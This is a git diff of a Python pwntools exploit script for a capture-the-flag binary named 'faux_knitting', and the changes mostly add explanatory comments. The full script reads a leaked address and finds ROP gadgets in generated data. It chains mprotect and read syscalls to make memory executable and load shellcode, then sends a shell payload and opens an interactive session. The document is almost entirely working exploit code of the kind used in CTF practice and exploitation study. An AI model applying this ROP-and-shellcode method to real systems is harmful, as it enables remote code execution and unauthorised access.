@@ -1,9 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 from pwn import *
-from math import floor
 import subprocess
-
+from time import sleep
 exe = context.binary = ELF('./faux_knitting')
 
 host = args.HOST or 'faux-01.hfsc.tf'
@@ -68,9 +67,15 @@ def createSyscallRop(rax, rdi, rsi, rdx, rcx, gadgets):
 io = start()
 io.recvuntil(b'mem:')
 base = int(io.recvline().strip(), 16)
+
+# generate random data
 subprocess.run(["./a.out"])
 rop = b''
+
+#read random data to memory
 rawData = open('memory.bin', 'rb').read()
+
+#find the index in the random data for the gadgets we need
 for gadget in gadgets:
     try:
         idx =  rawData.index(gadgets[gadget]['optcode']) + base
@@ -83,13 +88,16 @@ for gadget in gadgets:
 rop = b''
 
 
-# mprotect
+# create ropchain
+# mprotect the random data area to RWX
+# read in our shellcode to the start of the area
+# return to our shellcode
 rop = createSyscallRop(constants.SYS_mprotect, base, 0x800000, 7, 0, gadgets)
 rop += createSyscallRop(constants.SYS_read, 0, base, 0x100, 0, gadgets)
 rop += p64(base)
 io.sendline(rop)
-from time import sleep
 sleep(1)
+#ship the shellcode
 io.sendline(asm(shellcraft.sh()))
 io.interactive()
    
